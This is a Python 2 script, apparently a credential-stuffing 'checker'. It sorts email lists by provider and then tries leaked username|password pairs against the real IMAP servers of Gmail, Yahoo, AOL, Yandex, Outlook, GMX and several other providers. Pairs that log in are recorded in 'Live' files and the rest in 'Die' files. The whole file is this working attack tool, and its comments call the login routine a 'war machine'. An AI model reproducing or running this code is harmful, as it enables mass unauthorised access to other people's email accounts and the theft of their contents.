import time, sys
import shutil as fel



def waktu():
    t = time.localtime()
    hr = t.tm_hour
    mn = t.tm_min
    sc = t.tm_sec
    return '[{}:{}:{}] '.format(hr, mn, sc)

#chapter building masih perlu dilengkapi
def filter(rd):
    yh = open("yahoo-" + rd + ".txt", "w")
    gm = open("gmail-" + rd + ".txt", "w")
    ot = open("otherD-" + rd + ".txt", "w")
    ht = open("hotmailOutlLive-" + rd + ".txt", "w")
    to = open("t-online-" + rd + ".txt", "w")
    fr = open("free-" + rd + ".txt", "w")
    ao = open("aol-" + rd + ".txt", "w")
    ma = open("mail-" + rd + ".txt", "w")
    yx = open("yandex-" + rd + ".txt", "w")
    gx = open("gmx-" + rd + ".txt", "w")
    ali = open("alice-" + rd + ".txt", "w")
    ora = open("orange-" + rd + ".txt", "w")
    wan = open("wanadoo-" + rd + ".txt", "w")
    tis = open("tiscali-" + rd + ".txt", "w")
    web = open("web-" + rd + ".txt", "w")
    print waktu() + "[+]Starting..!!"
    time.sleep(1)
    nmf = raw_input(waktu() + "[+]Emaillist File Name: ")
    print waktu() + "[+]Opening File..!!"
    op = open(nmf, "r")
    time.sleep(1)
    print waktu() + "[+]Processing File...!!"
    rl = op.readlines()
    time.sleep(1)
    print waktu() + "[+]Ready..!!"
    print waktu() + "[+]Please Wait, may take a minute"
    totlin = len(rl)
    print waktu() + "[*]==--+ [" + str(totlin) + "%] +--=="
    print waktu() + "[*]==--+ [waiting..] +--=="
    idx = 0
    for i in rl:
        idx += 1
        sys.stdout.write("\r" + waktu() + "[*]==--+ [%d%%] +--==" % idx)
        sys.stdout.flush()
        if "@gmail" in i:
            gm.write(i)
        elif "@yahoo" in i:
            yh.write(i)
        elif "@hotmail" in i:
            ht.write(i)
        elif "@live" in i:
            ht.write(i)
        elif "@outlook" in i:
            ht.write(i)
        elif "@t-online" in i:
            to.write(i)
        elif "@free" in i:
            fr.write(i)
        elif "@aol" in i:
            ao.write(i)
        elif "@mail" in i:
            ma.write(i)
        elif "@yandex" in i:
            yx.write(i)
        elif "@gmx" in i:
            gx.write(i)
        elif "@alice" in i:
            ali.write(i)
        elif "@orange" in i:
            ora.write(i)
        elif "@wanadoo" in i:
            wan.write(i)
        elif "@tiscali" in i:
            tis.write(i)
        elif "@web" in i:
            web.write(i)
        else:
            ot.write(i)

    op.close()
    yh.close()
    gm.close()
    ot.close()
    ht.close()
    to.close()
    fr.close()
    ao.close()
    ma.close()
    yx.close()
    gx.close()
    ali.close()
    ora.close()
    wan.close()
    tis.close()
    web.close()
    time.sleep(0.2)
    print ""
    print waktu() + "[+]Removing file.."
    fel.move("yahoo-" + rd + ".txt", "ResFiltered")
    fel.move("gmail-" + rd + ".txt", "ResFiltered")
    fel.move("hotmailOutlLive-" + rd + ".txt", "ResFiltered")
    fel.move("t-online-" + rd + ".txt", "ResFiltered")
    fel.move("free-" + rd + ".txt", "ResFiltered")
    fel.move("aol-" + rd + ".txt", "ResFiltered")
    fel.move("mail-" + rd + ".txt", "ResFiltered")
    fel.move("otherD-" + rd + ".txt", "ResFiltered")
    fel.move("yandex-" + rd + ".txt", "ResFiltered")
    fel.move("gmx-" + rd + ".txt", "ResFiltered")
    fel.move("alice-" + rd + ".txt", "ResFiltered")
    fel.move("orange-" + rd + ".txt", "ResFiltered")
    fel.move("wanadoo-" + rd + ".txt", "ResFiltered")
    fel.move("tiscali-" + rd + ".txt", "ResFiltered")
    fel.move("web-" + rd + ".txt", "ResFiltered")
    print ""
    print waktu()+"[+]Done"
    print waktu()+"[+]Result stored in ResFiltered"

def gmail(rd):
    import imaplib
    gl = open('GmailLive-'+rd+'.txt', 'w')
    gd = open('GmailDie-'+rd+'.txt', 'w')
    # mesin perang
    def imapc(username, password):
        imap_ssl_host = 'imap.gmail.com'  # imap.mail.yahoo.com
        imap_ssl_port = 993

        server = imaplib.IMAP4_SSL(imap_ssl_host, imap_ssl_port)
        server.login(username, password)

        print waktu() + "[!]Live " + username + " | " + password
        gl.write("[!]Live " + username + " | " + password+"\n")

        time.sleep(0.1)
        server.logout()

    in_fl = raw_input(waktu() + "[+]Emaillist File Name root@d4rkm00ns: ")
    fl_op = open(in_fl, "r")
    op_rl = fl_op.readlines()
    # Script using in bellow
    # looping try
    x = 0
    for i in op_rl:
        username = i.strip().split("|")[0]
        password = i.strip().split("|")[1] #IndexERROR: JIKA delim bukan |
        x += 1
        print waktu() + "[+]count: %s" % x
        # try untuk menggagahkan error
        try:
            imapc(username, password)
        except Exception, e:
            print e  # pada fungsi waktu() bisa di insert pada fungsi lain tanpa menambah parameter
            print waktu() + "[!]Die " + username + " | " + password
            gd.write("[!]Die " + username + " | " + password+"\n")
        finally:
            print waktu() + "[+]./d4rkm00ns"
    fl_op.close()
    gl.close()
    gd.close()
    fel.move('GmailLive-'+rd+'.txt', 'Result')
    fel.move('GmailDie-'+rd+'.txt', 'Result')


def yahoo(rd):
    import imaplib
    yl = open('YahooLive-'+rd+'.txt', 'w')
    yd = open('YahooDie-'+rd+'.txt', 'w')
    # mesin perang
    def imapc(username, password):
        imap_ssl_host = 'imap.mail.yahoo.com'  # imap.mail.yahoo.com
        imap_ssl_port = 993

        server = imaplib.IMAP4_SSL(imap_ssl_host, imap_ssl_port)
        server.login(username, password)

        print waktu() + "[!]Live " + username + " | " + password
        yl.write("[!]Live "+username+" | "+password+"\n")
        time.sleep(0.1)
        server.logout()

    in_fl = raw_input(waktu() + "[+]Emaillist File Name root@d4rkm00ns: ")
    fl_op = open(in_fl, "r")
    op_rl = fl_op.readlines()
    # Script using in bellow
    # looping try
    x = 0
    for i in op_rl:
        username = i.strip().split("|")[0]
        password = i.strip().split("|")[1]
        x += 1
        print waktu() + "[+]count: %s" % x
        # try untuk menggagahkan error
        try:
            imapc(username, password)
        except Exception, e:
            print e  # pada fungsi waktu() bisa di insert pada fungsi lain tanpa menambah parameter
            print waktu() + "[!]Die " + username + " | " + password
            yd.write("[!]Die " + username + " | " + password+"\n")
        finally:
            print waktu() + "[+]./d4rkm00ns"
    fl_op.close()
    yl.close()
    yd.close()
    fel.move('YahooLive-'+rd+'.txt', 'Result')
    fel.move('YahooDie-'+rd+'.txt', 'Result')


def aol(rd):
    import imaplib
    # mesin perang
    al = open('AolLive-'+rd+'.txt', 'w')
    ad = open('AolDie-'+rd+'.txt', 'w')
    def imapc(username, password):
        imap_ssl_host = 'imap.aol.com'
        imap_ssl_port = 993

        server = imaplib.IMAP4_SSL(imap_ssl_host, imap_ssl_port)
        server.login(username, password)

        print waktu() + "[!]Live " + username + " | " + password
        al.write("[!]Live " + username + " | " + password+"\n")

        time.sleep(0.1)
        server.logout()

    in_fl = raw_input(waktu() + "[+]Emaillist File Name root@d4rkm00ns: ")
    fl_op = open(in_fl, "r")
    op_rl = fl_op.readlines()
    # Script using in bellow
    # looping try
    x = 0
    for i in op_rl:
        username = i.strip().split("|")[0]
        password = i.strip().split("|")[1]
        x += 1
        print waktu() + "[+]count: %s" % x
        # try untuk menggagahkan error
        try:
            imapc(username, password)
        except Exception, e:
            print e  # pada fungsi waktu() bisa di insert pada fungsi lain tanpa menambah parameter
            print waktu() + "[!]Die " + username + " | " + password
            ad.write("[!]Die " + username + " | " + password+"\n")
        finally:
            print waktu() + "[+]./d4rkm00ns"
    fl_op.close()
    al.close()
    ad.close()
    fel.move('AolLive-'+rd+'.txt', 'Result')
    fel.move('AolDie-'+rd+'.txt', 'Result')


def yandex(rd):
    import imaplib
    # mesin perang
    yl = open('YandexLive-'+rd+'.txt', 'w')
    yd = open('YandexDie-'+rd+'.txt', 'w')
    def imapc(username, password):
        imap_ssl_host = 'imap.yandex.com'
        imap_ssl_port = 993

        server = imaplib.IMAP4_SSL(imap_ssl_host, imap_ssl_port)
        server.login(username, password)

        print waktu() + "[!]Live " + username + " | " + password
        yl.write("[!]Live " + username + " | " + password+"\n")
        time.sleep(0.1)
        server.logout()

    in_fl = raw_input(waktu() + "[+]Emaillist File Name root@d4rkm00ns: ")
    fl_op = open(in_fl, "r")
    op_rl = fl_op.readlines()
    # Script using in bellow
    # looping try
    x = 0
    for i in op_rl:
        username = i.strip().split("|")[0]
        password = i.strip().split("|")[1]
        x += 1
        print waktu() + "[+]count: %s" % x
        # try untuk menggagahkan error
        try:
            imapc(username, password)
        except Exception, e:
            print e  # pada fungsi waktu() bisa di insert pada fungsi lain tanpa menambah parameter
            print waktu() + "[!]Die " + username + " | " + password
            yd.write("[!]Die " + username + " | " + password+"\n")
        finally:
            print waktu() + "[+]./d4rkm00ns"
    fl_op.close()
    yl.close()
    yd.close()
    fel.move('YandexLive-'+rd+'.txt', 'Result')
    fel.move('YandexDie-'+rd+'.txt', 'Result')


def outhotliv(rd):
    import imaplib
    # mesin perang
    ohl = open('OutHotLLive-'+rd+'.txt', 'w')
    ohd = open('OutHotLDie-'+rd+'.txt', 'w')
    def imapc(username, password):
        imap_ssl_host = 'imap-mail.outlook.com'
        imap_ssl_port = 993

        server = imaplib.IMAP4_SSL(imap_ssl_host, imap_ssl_port)
        server.login(username, password)

        print waktu() + "[!]Live " + username + " | " + password
        ohl.write("[!]Live " + username + " | " + password+"\n")
        time.sleep(0.1)
        server.logout()

    in_fl = raw_input(waktu() + "[+]Emaillist File Name root@d4rkm00ns: ")
    fl_op = open(in_fl, "r")
    op_rl = fl_op.readlines()
    # Script using in bellow
    # looping try
    x = 0
    for i in op_rl:
        username = i.strip().split("|")[0]
        password = i.strip().split("|")[1]
        x += 1
        print waktu() + "[+]count: %s" % x
        # try untuk menggagahkan error
        try:
            imapc(username, password)
        except Exception, e:
            print e  # pada fungsi waktu() bisa di insert pada fungsi lain tanpa menambah parameter
            print waktu() + "[!]Die " + username + " | " + password
            ohd.write("[!]Die " + username + " | " + password+"\n")
        finally:
            print waktu() + "[+]./d4rkm00ns"
    fl_op.close()
    ohl.close()
    ohd.close()
    fel.move('OutHotLLive-'+rd+'.txt', 'Result')
    fel.move('OutHotLDie-'+rd+'.txt', 'Result')


def orange(rd):
    import imaplib
    # mesin perang
    orl = open('OrangeLive-'+rd+'.txt', 'w')
    ord = open('OrangeDie-'+rd+'.txt', 'w')
    def imapc(username, password):
        imap_ssl_host = 'imap.orange.fr'
        imap_ssl_port = 993

        server = imaplib.IMAP4_SSL(imap_ssl_host, imap_ssl_port)
        server.login(username, password)

        print waktu() + "[!]Live " + username + " | " + password
        orl.write("[!]Live " + username + " | " + password+"\n")
        time.sleep(0.1)
        server.logout()

    in_fl = raw_input(waktu() + "[+]Emaillist File Name root@d4rkm00ns: ")
    fl_op = open(in_fl, "r")
    op_rl = fl_op.readlines()
    # Script using in bellow
    # looping try
    x = 0
    for i in op_rl:
        username = i.strip().split("|")[0]
        password = i.strip().split("|")[1]
        x += 1
        print waktu() + "[+]count: %s" % x
        # try untuk menggagahkan error
        try:
            imapc(username, password)
        except Exception, e:
            print e  # pada fungsi waktu() bisa di insert pada fungsi lain tanpa menambah parameter
            print waktu() + "[!]Die " + username + " | " + password
            ord.write("[!]Die " + username + " | " + password+"\n")
        finally:
            print waktu() + "[+]./d4rkm00ns"
    fl_op.close()
    orl.close()
    ord.close()
    fel.move('OrangeLive-'+rd+'.txt', 'Result')
    fel.move('OrangeDie-'+rd+'.txt', 'Result')


def alice(rd):
    import imaplib
    # mesin perang
    all = open('AliceLive-'+rd+'.txt', 'w')
    old = open('AliceDie-'+rd+'.txt', 'w')
    def imapc(username, password):
        imap_ssl_host = 'in.alice.it' #UN SSL
        imap_ssl_port = 143

        server = imaplib.IMAP4_SSL(imap_ssl_host, imap_ssl_port)
        server.login(username, password)

        print waktu() + "[!]Live " + username + " | " + password
        all.write("[!]Live " + username + " | " + password+"\n")
        time.sleep(0.1)
        server.logout()

    in_fl = raw_input(waktu() + "[+]Emaillist File Name root@d4rkm00ns: ")
    fl_op = open(in_fl, "r")
    op_rl = fl_op.readlines()
    # Script using in bellow
    # looping try
    x = 0
    for i in op_rl:
        username = i.strip().split("|")[0]
        password = i.strip().split("|")[1]
        x += 1
        print waktu() + "[+]count: %s" % x
        # try untuk menggagahkan error
        try:
            imapc(username, password)
        except Exception, e:
            print e  # pada fungsi waktu() bisa di insert pada fungsi lain tanpa menambah parameter
            print waktu() + "[!]Die " + username + " | " + password
            old.write("[!]Die " + username + " | " + password+"\n")
        finally:
            print waktu() + "[+]./d4rkm00ns"
    fl_op.close()
    all.close()
    old.close()
    fel.move('AliceLive-'+rd+'.txt', 'Result')
    fel.move('AliceDie-'+rd+'.txt', 'Result')


def gmx(rd):
    import imaplib
    # mesin perang
    ohl = open('GmxLive-'+rd+'.txt', 'w')
    ohd = open('GmxDie-'+rd+'.txt', 'w')
    def imapc(username, password):
        imap_ssl_host = 'imap.gmx.com'
        imap_ssl_port = 993

        server = imaplib.IMAP4_SSL(imap_ssl_host, imap_ssl_port)
        server.login(username, password)

        print waktu() + "[!]Live " + username + " | " + password
        ohl.write("[!]Live " + username + " | " + password+"\n")
        time.sleep(0.1)
        server.logout()

    in_fl = raw_input(waktu() + "[+]Emaillist File Name root@d4rkm00ns: ")
    fl_op = open(in_fl, "r")
    op_rl = fl_op.readlines()
    # Script using in bellow
    # looping try
    x = 0
    for i in op_rl:
        username = i.strip().split("|")[0]
        password = i.strip().split("|")[1]
        x += 1
        print waktu() + "[+]count: %s" % x
        # try untuk menggagahkan error
        try:
            imapc(username, password)
        except Exception, e:
            print e  # pada fungsi waktu() bisa di insert pada fungsi lain tanpa menambah parameter
            print waktu() + "[!]Die " + username + " | " + password
            ohd.write("[!]Die " + username + " | " + password+"\n")
        finally:
            print waktu() + "[+]./d4rkm00ns"
    fl_op.close()
    ohl.close()
    ohd.close()
    fel.move('GmxLive-'+rd+'.txt', 'Result')
    fel.move('GmxDie-'+rd+'.txt', 'Result')


def free(rd):
    import imaplib
    # mesin perang
    ohl = open('FreeLive-'+rd+'.txt', 'w')
    ohd = open('FreeDie-'+rd+'.txt', 'w')
    def imapc(username, password):
        imap_ssl_host = 'imap.free.fr'
        imap_ssl_port = 993

        server = imaplib.IMAP4_SSL(imap_ssl_host, imap_ssl_port)
        server.login(username, password)

        print waktu() + "[!]Live " + username + " | " + password
        ohl.write("[!]Live " + username + " | " + password+"\n")
        time.sleep(0.1)
        server.logout()

    in_fl = raw_input(waktu() + "[+]Emaillist File Name root@d4rkm00ns: ")
    fl_op = open(in_fl, "r")
    op_rl = fl_op.readlines()
    # Script using in bellow
    # looping try
    x = 0
    for i in op_rl:
        username = i.strip().split("|")[0]
        password = i.strip().split("|")[1]
        x += 1
        print waktu() + "[+]count: %s" % x
        # try untuk menggagahkan error
        try:
            imapc(username, password)
        except Exception, e:
            print e  # pada fungsi waktu() bisa di insert pada fungsi lain tanpa menambah parameter
            print waktu() + "[!]Die " + username + " | " + password
            ohd.write("[!]Die " + username + " | " + password+"\n")
        finally:
            print waktu() + "[+]./d4rkm00ns"
    fl_op.close()
    ohl.close()
    ohd.close()
    fel.move('FreeLive-'+rd+'.txt', 'Result')
    fel.move('FreeDie-'+rd+'.txt', 'Result')


def tonline(rd):
    import imaplib
    # mesin perang
    ohl = open('TonlineLive-'+rd+'.txt', 'w')
    ohd = open('TonlineDie-'+rd+'.txt', 'w')
    def imapc(username, password):
        imap_ssl_host = 'secureimap.t-online.de'
        imap_ssl_port = 993

        server = imaplib.IMAP4_SSL(imap_ssl_host, imap_ssl_port)
        server.login(username, password)

        print waktu() + "[!]Live " + username + " | " + password
        ohl.write("[!]Live " + username + " | " + password+"\n")
        time.sleep(0.1)
        server.logout()

    in_fl = raw_input(waktu() + "[+]Emaillist File Name root@d4rkm00ns: ")
    fl_op = open(in_fl, "r")
    op_rl = fl_op.readlines()
    # Script using in bellow
    # looping try
    x = 0
    for i in op_rl:
        username = i.strip().split("|")[0]
        password = i.strip().split("|")[1]
        x += 1
        print waktu() + "[+]count: %s" % x
        # try untuk menggagahkan error
        try:
            imapc(username, password)
        except Exception, e:
            print e  # pada fungsi waktu() bisa di insert pada fungsi lain tanpa menambah parameter
            print waktu() + "[!]Die " + username + " | " + password
            ohd.write("[!]Die " + username + " | " + password+"\n")
        finally:
            print waktu() + "[+]./d4rkm00ns"
    fl_op.close()
    ohl.close()
    ohd.close()
    fel.move('TonlineLive-'+rd+'.txt', 'Result')
    fel.move('TonlineDie-'+rd+'.txt', 'Result')


def mail(rd):
    import imaplib
    # mesin perang
    ohl = open('MailLive-'+rd+'.txt', 'w')
    ohd = open('MailDie-'+rd+'.txt', 'w')
    def imapc(username, password):
        imap_ssl_host = 'imap.mail.com'
        imap_ssl_port = 993

        server = imaplib.IMAP4_SSL(imap_ssl_host, imap_ssl_port)
        server.login(username, password)

        print waktu() + "[!]Live " + username + " | " + password
        ohl.write("[!]Live " + username + " | " + password+"\n")
        time.sleep(0.1)
        server.logout()

    in_fl = raw_input(waktu() + "[+]Emaillist File Name root@d4rkm00ns: ")
    fl_op = open(in_fl, "r")
    op_rl = fl_op.readlines()
    # Script using in bellow
    # looping try
    x = 0
    for i in op_rl:
        username = i.strip().split("|")[0]
        password = i.strip().split("|")[1]
        x += 1
        print waktu() + "[+]count: %s" % x
        # try untuk menggagahkan error
        try:
            imapc(username, password)
        except Exception, e:
            print e  # pada fungsi waktu() bisa di insert pada fungsi lain tanpa menambah parameter
            print waktu() + "[!]Die " + username + " | " + password
            ohd.write("[!]Die " + username + " | " + password+"\n")
        finally:
            print waktu() + "[+]./d4rkm00ns"
        time.sleep(0.1)
    ohl.close()
    ohd.close()
    fel.move('MailLive-'+rd+'.txt', 'Result')
    fel.move('MailDie-'+rd+'.txt', 'Result')


def web(rd):
    import imaplib
    # mesin perang
    ohl = open('WebLive-'+rd+'.txt', 'w')
    ohd = open('WebDie-'+rd+'.txt', 'w')
    def imapc(username, password):
        imap_ssl_host = 'imap.web.de'
        imap_ssl_port = 993

        server = imaplib.IMAP4_SSL(imap_ssl_host, imap_ssl_port)
        server.login(username, password)

        print waktu() + "[!]Live " + username + " | " + password
        ohl.write("[!]Live " + username + " | " + password+"\n")
        time.sleep(0.1)
        server.logout()

    in_fl = raw_input(waktu() + "[+]Emaillist File Name root@d4rkm00ns: ")
    fl_op = open(in_fl, "r")
    op_rl = fl_op.readlines()
    # Script using in bellow
    # looping try
    x = 0
    for i in op_rl:
        username = i.strip().split("|")[0]
        password = i.strip().split("|")[1]
        x += 1
        print waktu() + "[+]count: %s" % x
        # try untuk menggagahkan error
        try:
            imapc(username, password)
        except Exception, e:
            print e  # pada fungsi waktu() bisa di insert pada fungsi lain tanpa menambah parameter
            print waktu() + "[!]Die " + username + " | " + password
            ohd.write("[!]Die " + username + " | " + password+"\n")
        finally:
            print waktu() + "[+]./d4rkm00ns"
    fl_op.close()
    ohl.close()
    ohd.close()
    fel.move('WebLive-'+rd+'.txt', 'Result')
    fel.move('WebDie-'+rd+'.txt', 'Result')


def wanadoo(rd):
    import imaplib
    # mesin perang
    ohl = open('WanadooLive-'+rd+'.txt', 'w')
    ohd = open('WanadooDie-'+rd+'.txt', 'w')
    def imapc(username, password):
        imap_ssl_host = 'imap.orange.fr'
        imap_ssl_port = 993

        server = imaplib.IMAP4_SSL(imap_ssl_host, imap_ssl_port)
        server.login(username, password)

        print waktu() + "[!]Live " + username + " | " + password
        ohl.write("[!]Live " + username + " | " + password+"\n")
        time.sleep(0.1)
        server.logout()

    in_fl = raw_input(waktu() + "[+]Emaillist File Name root@d4rkm00ns: ")
    fl_op = open(in_fl, "r")
    op_rl = fl_op.readlines()
    # Script using in bellow
    # looping try
    x = 0
    for i in op_rl:
        username = i.strip().split("|")[0]
        password = i.strip().split("|")[1]
        x += 1
        print waktu() + "[+]count: %s" % x
        # try untuk menggagahkan error
        try:
            imapc(username, password)
        except Exception, e:
            print e  # pada fungsi waktu() bisa di insert pada fungsi lain tanpa menambah parameter
            print waktu() + "[!]Die " + username + " | " + password
            ohd.write("[!]Die " + username + " | " + password+"\n")
        finally:
            print waktu() + "[+]./d4rkm00ns"
    fl_op.close()
    ohl.close()
    ohd.close()
    fel.move('WanadooLive-'+rd+'.txt', 'Result')
    fel.move('WanadooDie-'+rd+'.txt', 'Result')


def tiscali(rd):
    import imaplib
    # mesin perang
    ohl = open('TiscaliLive-'+rd+'.txt', 'w')
    ohd = open('TiscaliDie-'+rd+'.txt', 'w')
    def imapc(username, password):
        imap_ssl_host = 'imap.tiscali.it'
        imap_ssl_port = 143

        server = imaplib.IMAP4_SSL(imap_ssl_host, imap_ssl_port)
        server.login(username, password)

        print waktu() + "[!]Live " + username + " | " + password
        ohl.write("[!]Live " + username + " | " + password+"\n")
        time.sleep(0.1)
        server.logout()

    in_fl = raw_input(waktu() + "[+]Emaillist File Name root@d4rkm00ns: ")
    fl_op = open(in_fl, "r")
    op_rl = fl_op.readlines()
    # Script using in bellow
    # looping try
    x = 0
    for i in op_rl:
        username = i.strip().split("|")[0]
        password = i.strip().split("|")[1]
        x += 1
        print waktu() + "[+]count: %s" % x
        # try untuk menggagahkan error
        try:
            imapc(username, password)
        except Exception, e:
            print e  # pada fungsi waktu() bisa di insert pada fungsi lain tanpa menambah parameter
            print waktu() + "[!]Die " + username + " | " + password
            ohd.write("[!]Die " + username + " | " + password+"\n")
        finally:
            print waktu() + "[+]./d4rkm00ns"
    fl_op.close()
    ohl.close()
    ohd.close()
    fel.move('TiscaliLive-'+rd+'.txt', 'Result')
    fel.move('TiscaliDie-'+rd+'.txt', 'Result')

def cusfil():
    print waktu() + "[+]Starting..!!"
    elis = raw_input(waktu()+"[+]Emaillist File Name: ")
    fstor = raw_input(waktu()+"[+]File Name to Stored Result: ")
    filt = raw_input(waktu()+"[+]Filter Domain ex: @internet.com: ")
    print waktu()+"[+]Opening File"
    op = open(elis, "r")
    ops = open(fstor, "w")
    time.sleep(1)
    print waktu()+"[+]Processing File...!!"
    rl = op.readlines()
    time.sleep(1)
    print waktu()+"[+]Ready..!!"
    print waktu()+"[+]Please wait, may take a minute"
    totlen = len(rl)
    print waktu()+"[+]==--+ ["+str(totlen)+"%] +--=="
    print waktu()+"[+]==--+ [waiting..] +--=="
    idx = 0
    for i in rl:
        idx += 1
        sys.stdout.write("\r" + waktu() + "[*]==--+ [%d%%] +--==" % idx)
        sys.stdout.flush()
        if str(filt) in i:
            ops.write(i)
        pass
    op.close()
    ops.close()
    fel.move(fstor, "ResFiltered")
    print ""
    print waktu()+"[+]Done"
    print waktu()+"[+]Result stored in ResFiltered"

def cusval():
    import imaplib
    # mesin perang
    def imapc(username, password, ser, por):
        imap_ssl_host = ser  # imap.mail.yahoo.com
        imap_ssl_port = por

        server = imaplib.IMAP4_SSL(imap_ssl_host, imap_ssl_port)
        server.login(username, password)

        print waktu() + "[!]Live " + username + " | " + password
        gl.write("[!]Live " + username + " | " + password+"\n")

        time.sleep(0.1)
        server.logout()

    in_fl = raw_input(waktu() + "[+]Emaillist File Name root@d4rkm00ns: ")
    ser = raw_input(waktu()+"[+]Set Server IMAP: ")
    por = raw_input(waktu()+"[+]Set Port IMAP: ")
    fnml = raw_input(waktu() + "[+]File LIVE Name to stored Result: ")
    fnmd = raw_input(waktu() + "[+]File DIE Name to stored Result: ")
    gl = open(fnml, 'w')
    gd = open(fnmd, 'w')
    fl_op = open(in_fl, "r")
    op_rl = fl_op.readlines()
    # Script using in bellow
    # looping try
    x = 0
    for i in op_rl:
        username = i.strip().split("|")[0]
        password = i.strip().split("|")[1] #IndexERROR: JIKA delim bukan |
        x += 1
        print waktu() + "[+]count: %s" % x
        # try untuk menggagahkan error
        try:
            imapc(username, password, ser, por)
        except Exception, e:
            print e  # pada fungsi waktu() bisa di insert pada fungsi lain tanpa menambah parameter
            print waktu() + "[!]Die " + username + " | " + password
            gd.write("[!]Die " + username + " | " + password+"\n")
        finally:
            print waktu() + "[+]./d4rkm00ns"
    fl_op.close()
    gl.close()
    gd.close()
    fel.move(fnml, 'Result')
    fel.move(fnmd, 'Result')